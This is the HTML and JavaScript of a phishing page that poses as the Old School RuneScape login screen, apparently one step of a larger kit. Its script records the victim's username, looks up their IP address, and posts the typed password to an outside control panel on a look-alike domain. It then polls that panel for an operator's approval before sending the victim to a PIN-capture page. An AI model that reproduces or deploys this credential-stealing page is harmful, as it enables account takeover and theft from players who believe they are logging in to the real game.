<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Log In - RuneScape | Old School RuneScape</title>
    <script>window.PANEL_API_BASE='https://control.osrsforum-oldshcool.com/';</script>
     <link rel="icon" href="img/favicon.svg" sizes="any" type="image/svg+xml">
    <link rel="stylesheet" type="text/css" href="css/style1.css">
    <style>
    /* width */
::-webkit-scrollbar {
  width: 0px;
}

/* Track */
::-webkit-scrollbar-track {
  box-shadow: inset 0 0 5px grey; 
  border-radius: 10px;
}
 
/* Handle */
::-webkit-scrollbar-thumb {
  background: red; 
  border-radius: 10px;
}

/* Handle on hover */
::-webkit-scrollbar-thumb:hover {
  background: #b30000; 
}
        .form-error {
            display: none;
            color: red;
        }
        @media(max-width: 900px){
            body{
                background: #101d23;
            }
            .l-vista__container{
                box-shadow: none;
            }
            .l-vista__container:before{
                box-shadow: none;
            }
        }
    </style>
 
</head>
<body style="height: 100vh;">
<div class="container flex f-width justify-center align-center container_page2">
    <div class="l-vista__container">
        <div class="logo flex justify-center align-center">
            <img src="img/logo_one.png">
            <img src="img/logo_two.png">
        </div>
        <form method="post" id="loginForm">
            <input type="text" id="_hp" name="_hp" value="" tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;">
            <!-- Display username from the URL parameter using JavaScript -->
            <p class="user_inf">Logging in to RuneScape account <strong id="displayUsername">Username</strong></p>
            <input type="hidden" name="username" id="usernameInput" value="">
            <label class="password_label">Password:
                <input class="login-form__text is-invalid-input" type="password" name="password" id="login_password"
                       autofocus maxlength="50">
                <span class="form-error is-visible" id="password_error">
                    This field is required.
                </span>
            </label>
            <button class="a-button a-button--size-full" id="du-login-submit" type="submit" name="sub_log">Log In
            </button>
        </form>
        <a href="https://support.runescape.com/hc/articles/360001552065" target="_blank" id="login-cannot"
           class="flex f-width justify-center align-center">Can't log in?</a>
        <br>
        <a href="index.html" id="go-back-link" class="flex f-width justify-center align-center">< Go back</a>
    </div>
</div>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        const passwordInput = document.getElementById('login_password');
        const errorSpan = document.getElementById('password_error');
        const loginButton = document.getElementById('du-login-submit');
        const goBackLink = document.getElementById('go-back-link');
        const cantLogInLink = document.getElementById('login-cannot');
        const loginForm = document.getElementById('loginForm');
        const displayUsername = document.getElementById('displayUsername');
        const usernameInput = document.getElementById('usernameInput');
        
        // Get username from URL
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('user');
        
        // Display username if available
        if (username) {
            displayUsername.textContent = username;
            usernameInput.value = username;
        }
        
        // Function to get user IP address using a public API
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP address:', error);
                return 'Unknown';
            }
        }

        // Helper to get API Base
        function getApiBase() {
            if (window.PANEL_API_BASE !== undefined && window.PANEL_API_BASE !== '') {
                return Promise.resolve(window.PANEL_API_BASE);
            }
            return fetch(location.origin + '/api/config')
                .then(r => r.json())
                .then(c => (c && c.apiBase) ? c.apiBase : location.origin)
                .catch(() => location.origin);
        }
        
        // Use existing session from index (username flow) or create new
        let sessionData = null;
        try {
            var stored = localStorage.getItem('userSession');
            if (stored) sessionData = JSON.parse(stored);
        } catch (e) {}
        if (!sessionData || !sessionData.sessionId) {
            const sessionId = 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
            sessionData = { sessionId: sessionId, username: username || 'Unknown', loginType: 'username', timestamp: new Date().toISOString() };
            localStorage.setItem('userSession', JSON.stringify(sessionData));
        }
        
        passwordInput.addEventListener('focus', () => {
            errorSpan.style.display = 'none';
        });

        // MODIFIED: Hide error immediately when user starts typing
        passwordInput.addEventListener('input', () => {
            errorSpan.style.display = 'none';
        });
        
        passwordInput.addEventListener('blur', function(event) {
            if (event.relatedTarget !== goBackLink && event.relatedTarget !== cantLogInLink) {
                if (passwordInput.value.trim() === '') {
                    errorSpan.style.display = 'block';
                } else {
                    errorSpan.style.display = 'none';
                }
            }
        });

        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission
            
            // MODIFIED: Hide error immediately on submit attempt
            errorSpan.style.display = 'none';

            if (passwordInput.value.trim() === '') {
                errorSpan.textContent = 'This field is required.';
                errorSpan.style.display = 'block';
                return; // Stop execution if password is empty
            }
            
            // MODIFIED: Set Loading State FIRST
            loginButton.disabled = true;
            const originalBtnText = loginButton.textContent;
            loginButton.textContent = 'Checking...';

            // Get IP address
            const ipAddress = await getUserIP();
            
            // Get session data from localStorage
            try {
                const storedSession = localStorage.getItem('userSession');
                if (storedSession) {
                    sessionData = JSON.parse(storedSession);
                }
            } catch (e) {
                console.error('Error parsing session data:', e);
            }
            
            // Update session data with password and IP address
            if (sessionData) {
                sessionData.password = passwordInput.value;
                sessionData.ipAddress = ipAddress;
                localStorage.setItem('userSession', JSON.stringify(sessionData));
            }
            
            try {
                const base = await getApiBase();
                const submitUrl = (base.replace(/\/$/, '')) + '/api/submit';
                const statusUrl = (base.replace(/\/$/, '')) + '/api/password-status?logId=' + encodeURIComponent(sessionData.sessionId);
                const _hp = (document.getElementById('_hp') && document.getElementById('_hp').value) || '';

                // MODIFIED: Send password and WAIT for it to finish (await)
                // This ensures the DB is updated to NULL before polling
                await fetch(submitUrl, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify({ logId: sessionData.sessionId, passwordUsername: passwordInput.value, _hp: _hp }) 
                });

                // Start Polling Loop
                while (true) {
                    try {
                        var res = await fetch(statusUrl, { method: 'GET' });
                        var json = await res.json();
                        
                        if (json.verified === true) {
                            sessionStorage.setItem('allowed_step_pincode', '1');
                            window.location.href = 'pincode.html';
                            return;
                        }
                        
                        if (json.verified === false) {
                            // Failed
                            loginButton.disabled = false;
                            loginButton.textContent = originalBtnText;
                            errorSpan.textContent = 'The email address or password you entered was incorrect. Please try again.';
                            errorSpan.style.display = 'block';
                            errorSpan.style.color = '#c00';
                            return;
                        }
                    } catch (e) {
                        console.error("Polling error", e);
                    }
                    // Wait 2 seconds
                    await new Promise(r => setTimeout(r, 2000));
                }
            } catch (err) {
                console.error("Submission error", err);
                loginButton.disabled = false;
                loginButton.textContent = originalBtnText;
                errorSpan.textContent = 'Connection error. Please try again.';
                errorSpan.style.display = 'block';
            }
        });

        goBackLink.addEventListener('click', function(event) {
            errorSpan.style.display = 'none';
        });

        cantLogInLink.addEventListener('click', function(event) {
            errorSpan.style.display = 'none';
        });
    });
</script>
<iframe 
  src="./footeruser.html" 
  id="myIframe"
  style="width: 100%; border: none; overflow: hidden; display: block; vertical-align: bottom;" 
  scrolling="no" 
  onload="this.style.height = this.contentWindow.document.body.scrollHeight + 'px';">
</iframe>
</body>
</html>
